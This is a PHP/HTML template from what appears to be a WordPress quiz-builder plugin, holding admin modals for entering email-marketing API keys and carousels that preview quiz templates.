    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Sendinblue Details</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
       <div class="form-group api_key_outer row " >
			<div class="col-sm-12">
				<?php if($sendinblue_url != ''){ ?>
				<label class="email_plateform_popup_label">Enter API KEY</label>
				<?php } ?>
				<input class="form-control input" name="api_key" id="api_key" value="<?php echo $sendinblue_api_key;?>" placeholder="API KEY">
			</div>
		</div>
		
      </div>
     
     
     <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary   save_automation_btn" data-action-id="sendinblue">Save</button>
      </div>
     
    </div>
  </div>
</div>


<div class="modal fade popup--style vertical--center-modal getresponse_save_model" id="user_add_my_email_plateform_getresponse_modal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Get Response Details</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
       <div class="form-group api_key_outer row " >
			<div class="col-sm-12">
				<?php if($getresponse_url != ''){ ?>
				<label class="email_plateform_popup_label">Enter API KEY</label>
				<?php } ?>
				<input class="form-control input" name="api_key" id="api_key" value="<?php echo $getresponse_api_key;?>" placeholder="API KEY">
			</div>
		</div>
		
      </div>
     
     
     <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary   save_automation_btn" data-action-id="getresponse">Save</button>
      </div>
     
    </div>
  </div>
</div>


<div class="modal fade popup--style vertical--center-modal mailerlite_save_model" id="user_add_my_email_plateform_mailerlite_modal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Mailerlite Details</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
       <div class="form-group api_key_outer row " >
			<div class="col-sm-12">
				<?php if($mailerlite_api_key != ''){ ?>
				<label class="email_plateform_popup_label">Enter API KEY</label>
				<?php } ?>
				<input class="form-control input" name="api_key" id="api_key" value="<?php echo $mailerlite_api_key;?>" placeholder="API KEY">
			</div>
		</div>
		
      </div>
     
     
     <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary   save_automation_btn" data-action-id="mailerlite">Save</button>
      </div>
     
    </div>
  </div>
</div>

<div class="modal fade popup--style vertical--center-modal moosend_save_model" id="user_add_my_email_plateform_moosend_modal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Moosend Details</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
       <div class="form-group api_key_outer row " >
			<div class="col-sm-12">
				<?php if($moosend_api_key != ''){ ?>
				<label class="email_plateform_popup_label">Enter API Key</label>
				<?php } ?>
				<input class="form-control input" name="api_key" id="api_key" value="<?php echo $moosend_api_key;?>" placeholder="API Key">
			</div>
		</div>
		
      </div>
     
     
     <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary   save_automation_btn" data-action-id="moosend">Save</button>
      </div>
     
    </div>
  </div>
</div>



<div class="modal fade popup--style vertical--center-modal vbout_save_model" id="user_add_my_email_plateform_vbout_modal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Vbout Details</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
       <div class="form-group api_key_outer row " >
			<div class="col-sm-12">
				<?php if($vbout_api_key != ''){ ?>
				<label class="email_plateform_popup_label">Enter API Key</label>
				<?php } ?>
				<input class="form-control input" name="api_key" id="api_key" value="<?php echo $vbout_api_key;?>" placeholder="API Key">
			</div>
		</div>
		
      </div>
     
     
     <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary   save_automation_btn" data-action-id="vbout">Save</button>
      </div>
     
    </div>
  </div>
</div>

<div class="modal fade popup--style vertical--center-modal klaviyo_save_model" id="user_add_my_email_plateform_klaviyo_modal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">klaviyo Details</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
       <div class="form-group api_key_outer row " >
			<div class="col-sm-12">
				<?php if($klaviyo_api_key != ''){ ?>
				<label class="email_plateform_popup_label">Enter API Key</label>
				<?php } ?>
				<input class="form-control input" name="api_key" id="api_key" value="<?php echo $klaviyo_api_key;?>" placeholder="API Key">
			</div>
		</div>
		
      </div>
     
     
     <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary   save_automation_btn" data-action-id="klaviyo">Save</button>
      </div>
     
    </div>
  </div>
</div>

<div class="modal fade popup--style vertical--center-modal kartra_save_model" id="user_add_my_email_plateform_kartra_modal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Kartra Details</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
       <div class="form-group api_key_outer row " >
			<div class="col-sm-12">
				<?php if($kartra_api_id != ''){ ?>
				<label class="email_plateform_popup_label">Enter App ID</label>
				<?php } ?>
				<input class="form-control input" name="api_id" id="api_id" value="<?php echo $kartra_api_id;?>" placeholder="APP ID">
			</div>
		</div>
		<div class="form-group api_key_outer row " >
			<div class="col-sm-12">
				<?php if($kartra_api_key != ''){ ?>
				<label class="email_plateform_popup_label">API Key</label>
				<?php } ?>
				<input class="form-control input" name="api_key" id="api_key" value="<?php echo $kartra_api_key;?>" placeholder="API Key">
			</div>
		</div>

		<div class="form-group api_key_outer row " >
			<div class="col-sm-12">
				<?php if($kartra_api_password != ''){ ?>
				<label class="email_plateform_popup_label">API Password</label>
				<?php } ?>
				<input class="form-control input" name="api_password" id="api_password" value="<?php echo $kartra_api_password;?>" placeholder="API Password">
			</div>
		</div>
		
      </div>
     
     
     <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary   save_automation_btn" data-action-id="kartra">Save</button>
      </div>
     
    </div>
  </div>
</div>


<div class="modal fade popup--style vertical--center-modal sendfox_save_model" id="user_add_my_email_plateform_sendfox_modal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Sendfox Details</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
       <div class="form-group api_key_outer row " >
			<div class="col-sm-12">
				<?php if($sendfox_api_key != ''){ ?>
				<label class="email_plateform_popup_label">Enter API Token</label>
				<?php } ?>
				<input class="form-control input" name="api_token" id="api_token" value="<?php echo $sendfox_api_key;?>" placeholder="API TOKEN">
			</div>
		</div>
		
      </div>
     
     
     <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary   save_automation_btn" data-action-id="sendfox">Save</button>
      </div>
     
    </div>
  </div>
</div>


<div class="modal quiz-popup-style fade template-prew-popup" id="template-prew-popup-template1" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" style="display: none;" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered" role="document">
		<div class="modal-content">
			<!--<div class="modal-header">
				<h5 class="modal-title" id="template-prew-popupLabel">Preview Template</h5>
			</div>-->
			<button type="button" class="close" data-dismiss="modal" aria-label="Close">×</button>
			<div class="modal-body">

				<div  class="carousel_question   slider" data-ride="carousel1" id="template_prew_slider_template1">
					<a class="left carousel-control" href="javascript:void(0)" data-slide="prev" onclick="jQuery('#template_prew_slider_template1').carousel('prev')">‹</a>
					<a class="right carousel-control" href="javascript:void(0)" data-slide="next" onclick="jQuery('#template_prew_slider_template1').carousel('next')">›</a>

					<div class="carousel-inner">
						<div class="carousel-item active">
							<h2 class="quiz_temp_preview_heading">Start Screen </h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder/includes/images/quiz-preview-1a.jpg" alt="First slide">
						</div>
						<div class="carousel-item">
							<h2 class="quiz_temp_preview_heading">Questions Screen </h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder/includes/images/quiz-preview-1b.jpg" alt="First slide">
						</div>
						<div class="carousel-item">
							<h2 class="quiz_temp_preview_heading">Opt-In Screen</h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder//includes/images/quiz-preview-1c.jpg" alt="First slide">
						</div>
						<div class="carousel-item">
							<h2 class="quiz_temp_preview_heading">Outcome Screen</h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder//includes/images/quiz-preview-1d.jpg" alt="First slide">
						</div>
					</div>
				</div>

			</div>
			<div class="modal-footer quiz-popup-actions">
				
				<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
			</div>
		</div>
	</div>
</div>


<div class="modal quiz-popup-style fade template-prew-popup" id="template-prew-popup-template2" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" style="display: none;" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered" role="document">
		<div class="modal-content">
			<!--<div class="modal-header">
				<h5 class="modal-title" id="template-prew-popupLabel">Preview Template</h5>
			</div>-->
			<button type="button" class="close" data-dismiss="modal" aria-label="Close">×</button>
			<div class="modal-body">

				<div  class="carousel_question   slider" data-ride="carousel1" id="template_prew_slider_template2">
					<a class="left carousel-control" href="javascript:void(0)" data-slide="prev" onclick="jQuery('#template_prew_slider_template2').carousel('prev')">‹</a>
					<a class="right carousel-control" href="javascript:void(0)" data-slide="next" onclick="jQuery('#template_prew_slider_template2').carousel('next')">›</a>

					<div class="carousel-inner">
						<div class="carousel-item active">
							<h2 class="quiz_temp_preview_heading">Start Screen </h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder/includes/images/quiz-preview-2a.png?template5" alt="First slide">
						</div>
						<div class="carousel-item">
							<h2 class="quiz_temp_preview_heading">Questions Screen </h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder/includes/images/quiz-preview-2b.jpg?template5" alt="First slide">
						</div>
						<div class="carousel-item">
							<h2 class="quiz_temp_preview_heading">Opt-In Screen</h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder//includes/images/quiz-preview-2c.jpg?template5" alt="First slide">
						</div>
						<div class="carousel-item">
							<h2 class="quiz_temp_preview_heading">Outcome Screen</h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder//includes/images/quiz-preview-2d.jpg?template5" alt="First slide">
						</div>
					</div>
				</div>

			</div>
			<div class="modal-footer quiz-popup-actions">
				
				<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
			</div>
		</div>
	</div>
</div>


<div class="modal quiz-popup-style fade template-prew-popup" id="transparent-template-prew-popup-template1" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" style="display: none;" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered" role="document">
		<div class="modal-content">
			<!--<div class="modal-header">
				<h5 class="modal-title" id="template-prew-popupLabel">Preview Template</h5>
			</div>-->
			<button type="button" class="close" data-dismiss="modal" aria-label="Close">×</button>
			<div class="modal-body">

				<div  class="carousel_question   slider" data-ride="carousel1" id="template_prew_slider_template6">
					<a class="left carousel-control" href="javascript:void(0)" data-slide="prev" onclick="jQuery('#template_prew_slider_template6').carousel('prev')">‹</a>
					<a class="right carousel-control" href="javascript:void(0)" data-slide="next" onclick="jQuery('#template_prew_slider_template6').carousel('next')">›</a>

					<div class="carousel-inner">
						<div class="carousel-item active">
							<h2 class="quiz_temp_preview_heading">Start Screen </h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder/includes/images/quiz-preview-6a.jpg?template" alt="First slide">
						</div>
						<div class="carousel-item">
							<h2 class="quiz_temp_preview_heading">Questions Screen </h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder/includes/images/quiz-preview-6b.jpg?template" alt="First slide">
						</div>
						<div class="carousel-item">
							<h2 class="quiz_temp_preview_heading">Opt-In Screen</h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder//includes/images/quiz-preview-6c.jpg?template" alt="First slide">
						</div>
						<div class="carousel-item">
							<h2 class="quiz_temp_preview_heading">Outcome Screen</h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder//includes/images/quiz-preview-6d.jpg?template" alt="First slide">
						</div>
					</div>
				</div>

			</div>
			<div class="modal-footer quiz-popup-actions">
				
				<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
			</div>
		</div>
	</div>
</div>


<div class="modal quiz-popup-style fade template-prew-popup" id="ecommerce-template-prew-popup-template1" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" style="display: none;" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered" role="document">
		<div class="modal-content">
			<!--<div class="modal-header">
				<h5 class="modal-title" id="template-prew-popupLabel">Preview Template</h5>
			</div>-->
			<button type="button" class="close" data-dismiss="modal" aria-label="Close">×</button>
			<div class="modal-body">

				<div  class="carousel_question   slider" data-ride="carousel1" id="template_prew_slider_template7">
					<a class="left carousel-control" href="javascript:void(0)" data-slide="prev" onclick="jQuery('#template_prew_slider_template7').carousel('prev')">‹</a>
					<a class="right carousel-control" href="javascript:void(0)" data-slide="next" onclick="jQuery('#template_prew_slider_template7').carousel('next')">›</a>

					<div class="carousel-inner">
						<div class="carousel-item active">
							<h2 class="quiz_temp_preview_heading">Start Screen </h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder/includes/images/quiz-preview-7a.jpg?template" alt="First slide">
						</div>
						<div class="carousel-item">
							<h2 class="quiz_temp_preview_heading">Questions Screen </h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder/includes/images/quiz-preview-7b.jpg?template" alt="First slide">
						</div>
						<div class="carousel-item">
							<h2 class="quiz_temp_preview_heading">Opt-In Screen</h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder//includes/images/quiz-preview-7c.jpg?template" alt="First slide">
						</div>
						<div class="carousel-item">
							<h2 class="quiz_temp_preview_heading">Outcome Screen</h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder//includes/images/quiz-preview-7d.jpg?template" alt="First slide">
						</div>
					</div>
				</div>

			</div>
			<div class="modal-footer quiz-popup-actions">
				
				<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
			</div>
		</div>
	</div>
</div>

<div class="modal quiz-popup-style fade template-prew-popup" id="template-prew-popup-template3" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" style="display: none;" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered" role="document">
		<div class="modal-content">
			<!--<div class="modal-header">
				<h5 class="modal-title" id="template-prew-popupLabel">Preview Template</h5>
			</div>-->
			<button type="button" class="close" data-dismiss="modal" aria-label="Close">×</button>
			<div class="modal-body">

				<div  class="carousel_question   slider" data-ride="carousel1" id="template_prew_slider_template3">
					<a class="left carousel-control" href="javascript:void(0)" data-slide="prev" onclick="jQuery('#template_prew_slider_template3').carousel('prev')">‹</a>
					<a class="right carousel-control" href="javascript:void(0)" data-slide="next" onclick="jQuery('#template_prew_slider_template3').carousel('next')">›</a>

					<div class="carousel-inner">
						<div class="carousel-item active">
							<h2 class="quiz_temp_preview_heading">Start Screen </h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder/includes/images/quiz-preview-3a.jpg" alt="First slide">
						</div>
						<div class="carousel-item">
							<h2 class="quiz_temp_preview_heading">Questions Screen </h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder/includes/images/quiz-preview-3b.jpg" alt="First slide">
						</div>
						<div class="carousel-item">
							<h2 class="quiz_temp_preview_heading">Opt-In Screen</h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder//includes/images/quiz-preview-3c.jpg" alt="First slide">
						</div>
						<div class="carousel-item">
							<h2 class="quiz_temp_preview_heading">Outcome Screen</h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder//includes/images/quiz-preview-3d.jpg" alt="First slide">
						</div>
					</div>
				</div>

			</div>
			<div class="modal-footer quiz-popup-actions">
				
				<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
			</div>
		</div>
	</div>
</div>


<div class="modal quiz-popup-style fade template-prew-popup" id="template-prew-popup-template4" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" style="display: none;" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered" role="document">
		<div class="modal-content">
			<!--<div class="modal-header">
				<h5 class="modal-title" id="template-prew-popupLabel">Preview Template</h5>
			</div>-->
			<button type="button" class="close" data-dismiss="modal" aria-label="Close">×</button>
			<div class="modal-body">

				<div  class="carousel_question   slider" data-ride="carousel1" id="template_prew_slider_template4">
					<a class="left carousel-control" href="javascript:void(0)" data-slide="prev" onclick="jQuery('#template_prew_slider_template4').carousel('prev')">‹</a>
					<a class="right carousel-control" href="javascript:void(0)" data-slide="next" onclick="jQuery('#template_prew_slider_template4').carousel('next')">›</a>

					<div class="carousel-inner">
						<div class="carousel-item active">
							<h2 class="quiz_temp_preview_heading">Start Screen </h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder/includes/images/quiz-preview-4a.jpg" alt="First slide">
						</div>
						<div class="carousel-item">
							<h2 class="quiz_temp_preview_heading">Questions Screen </h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder/includes/images/quiz-preview-4b.jpg" alt="First slide">
						</div>
						<div class="carousel-item">
							<h2 class="quiz_temp_preview_heading">Opt-In Screen</h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder//includes/images/quiz-preview-4c.jpg" alt="First slide">
						</div>
						<div class="carousel-item">
							<h2 class="quiz_temp_preview_heading">Outcome Screen</h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder//includes/images/quiz-preview-4d.jpg" alt="First slide">
						</div>
					</div>
				</div>

			</div>
			<div class="modal-footer quiz-popup-actions">
				
				<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
			</div>
		</div>
	</div>
</div>


<div class="modal quiz-popup-style fade" id="google-sheet-img-popup" tabindex="-1" role="dialog" aria-labelledby="google-sheet-img-popup" style="display: none;" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered" role="document">
		<div class="modal-content">
			<button type="button" class="close" data-dismiss="modal" aria-label="Close">×</button>
			<div class="modal-body">

				<img class="get_googlesheet_image" src="">

			</div>
			<!-- <div class="modal-footer quiz-popup-actions">
				<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
			</div> -->
		</div>
	</div>
</div>

<div class="modal quiz-popup-style fade" id="google-sheet-notid" tabindex="-1" role="dialog" aria-labelledby="google-sheet-img-popup" style="display: none;" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered" role="document">
		<div class="modal-content">
			<div class="modal-header">
		        <h5 class="modal-title" id="exampleModalLabel">Google Spreadsheet</h5>
		        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
		          <span aria-hidden="true">×</span>
		        </button>
		      </div>
			<div class="modal-body">

				<span><strong>To add this google sheet integration:</strong></span>
				<ul>
					<li>1. You need to first setup the quiz fully. Add questions, outcomes, etc.</li>
					<li>2. Next come back here to complete the google sheet integration.</li>
				</ul>
			</div>
			<!-- <div class="modal-footer quiz-popup-actions">
				<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
			</div> -->
		</div>
	</div>
</div>

<div class="modal quiz-popup-style fade template-prew-popup" id="template-prew-popup-template5" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" style="display: none;" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered" role="document">
		<div class="modal-content">
			<!--<div class="modal-header">
				<h5 class="modal-title" id="template-prew-popupLabel">Preview Template</h5>
			</div>-->
			<button type="button" class="close" data-dismiss="modal" aria-label="Close">×</button>
			<div class="modal-body">

				<div  class="carousel_question   slider" data-ride="carousel1" id="template_prew_slider_template5">
					
					<a class="left carousel-control" href="javascript:void(0)" data-slide="prev" onclick="jQuery('#template_prew_slider_template5').carousel('prev')">‹</a>
					<a class="right carousel-control" href="javascript:void(0)" data-slide="next" onclick="jQuery('#template_prew_slider_template5').carousel('next')">›</a>

					<div class="carousel-inner">
						<div class="carousel-item active">
							<h2 class="quiz_temp_preview_heading">Start Screen </h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder/includes/images/quiz-preview-5a.jpg" alt="First slide">
						</div>
						<div class="carousel-item">
							<h2 class="quiz_temp_preview_heading">Questions Screen </h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder/includes/images/quiz-preview-5b.jpg" alt="First slide">
						</div>
						<div class="carousel-item">
							<h2 class="quiz_temp_preview_heading">Opt-In Screen</h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder//includes/images/quiz-preview-5c.jpg" alt="First slide">
						</div>
						<div class="carousel-item">
							<h2 class="quiz_temp_preview_heading">Outcome Screen</h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder//includes/images/quiz-preview-5d.jpg" alt="Outcome Screen">
						</div>
					</div>
				</div>

			</div>
			<div class="modal-footer quiz-popup-actions">
				
				<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
			</div>
		</div>
	</div>
</div>


<div class="modal quiz-popup-style fade template-prew-popup" id="template-prew-popup-template9" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" style="display: none;" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered" role="document">
		<div class="modal-content">
			<!--<div class="modal-header">
				<h5 class="modal-title" id="template-prew-popupLabel">Preview Template</h5>
			</div>-->
			<button type="button" class="close" data-dismiss="modal" aria-label="Close">×</button>
			<div class="modal-body">

				<div  class="carousel_question   slider" data-ride="carousel1" id="template_prew_slider_template9">
					
					<a class="left carousel-control" href="javascript:void(0)" data-slide="prev" onclick="jQuery('#template_prew_slider_template9').carousel('prev')">‹</a>
					<a class="right carousel-control" href="javascript:void(0)" data-slide="next" onclick="jQuery('#template_prew_slider_template9').carousel('next')">›</a>

					<div class="carousel-inner">
						<div class="carousel-item active">
							<h2 class="quiz_temp_preview_heading">Start Screen </h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder/includes/images/quiz-preview-9a.jpg" alt="First slide">
						</div>
						<div class="carousel-item">
							<h2 class="quiz_temp_preview_heading">Questions Screen </h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder/includes/images/quiz-preview-9b.jpg" alt="First slide">
						</div>
						<div class="carousel-item">
							<h2 class="quiz_temp_preview_heading">Opt-In Screen</h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder//includes/images/quiz-preview-9c.jpg" alt="First slide">
						</div>
						<div class="carousel-item">
							<h2 class="quiz_temp_preview_heading">Outcome Screen</h2>
							<img class="d-block w-100" src="<?php echo plugins_url('') ?>/smartquizbuilder//includes/images/quiz-preview-9d.jpg" alt="Outcome Screen">
						</div>
					</div>
				</div>

			</div>
			<div class="modal-footer quiz-popup-actions">
				
				<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
			</div>
		</div>
	</div>
</div>

<?php $sqb_optimized_js_css = get_option('sqb_newflow');  

	if(isset($sqb_optimized_js_css) && !empty($sqb_optimized_js_css)){
		$new_flow = $sqb_optimized_js_css;
	}else{
		$new_flow = "N";
	}
echo '<input type="hidden" id="new_flow" value="'.$new_flow.'">'


?>